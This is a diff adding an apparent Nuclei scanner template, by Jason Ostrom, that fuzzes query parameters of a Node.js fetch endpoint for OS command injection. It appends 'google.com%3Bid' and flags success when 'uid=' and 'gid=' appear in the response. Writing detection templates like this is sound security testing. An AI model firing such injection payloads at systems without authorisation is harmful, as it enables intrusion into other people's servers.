@@ -1,0 +1,36 @@
+id: os-command-injection-api-nodejs 
+
+info:
+  name: OS Command Injection via fetch api endpoint 
+  author: Jason Ostrom 
+  severity: critical 
+
+variables:
+  result: "google.com%3Bid"
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - '{{concat("", "§result§", "")}}'
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: multiple
+        fuzz:
+          - "{{reflection}}"
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'uid=\d+'
+      - type: regex
+        part: body
+        regex:
+          - 'gid=\d+'
